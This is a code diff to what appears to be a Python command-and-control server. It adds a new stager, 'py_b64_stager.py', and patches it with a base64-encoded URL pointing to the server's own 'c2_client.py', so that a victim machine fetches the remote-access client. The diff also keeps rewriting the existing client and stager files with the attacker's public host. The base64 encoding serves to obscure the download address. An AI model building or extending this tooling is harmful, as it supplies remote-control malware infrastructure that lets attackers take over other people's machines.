@@ -6,6 +6,7 @@ import json
 import os
 import logging
 import urllib.request
+import base64 # import for b64 encoding for the b64 stager
 
 # Correct path to configuration file
 config_path = os.path.join(os.path.dirname(__file__), 'config', 'config.json')
@@ -83,15 +84,22 @@ def start_listener():
         client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
         client_handler.start()
 
+def base64_encode(string):
+    return base64.b64encode(string.encode('utf-8')).decode('utf-8')
+
 def update_client_file():
     files_to_update = [
         os.path.join(os.path.dirname(__file__), 'Stagers', 'c2_client.py'),
-        os.path.join(os.path.dirname(__file__), 'Stagers', 'python_stager.py')
+        os.path.join(os.path.dirname(__file__), 'Stagers', 'python_stager.py'),
+        os.path.join(os.path.dirname(__file__), 'Stagers', 'py_b64_stager.py')
     ]
 
+    base64_public_host = base64_encode(f"http://{PUBLIC_HOST}/c2_client.py")
+    
     search_replace_pairs = {
         'c2_client.py': ("SERVER_HOST = '1.1.1.1'", f"SERVER_HOST = '{PUBLIC_HOST}'"),
-        'python_stager.py': ("http://1.1.1.1/c2_client.py", f"http://{PUBLIC_HOST}/c2_client.py")
+        'python_stager.py': ("http://1.1.1.1/c2_client.py", f"http://{PUBLIC_HOST}/c2_client.py"),
+        'py_b64_stager.py': ("encoded_url = 'insert_base64_url'", f"encoded_url = '{base64_public_host}'")
     }
     
     for file_path in files_to_update:
@@ -119,6 +127,7 @@ def update_client_file():
             print(f"[*] Updated {file_path} with server IP: {PUBLIC_HOST}")
         except Exception as e:
             print(f"[!] Error processing file {file_path}: {e}")
+
 
 def start_http_server():
     update_client_file()  # Update the client file before serving
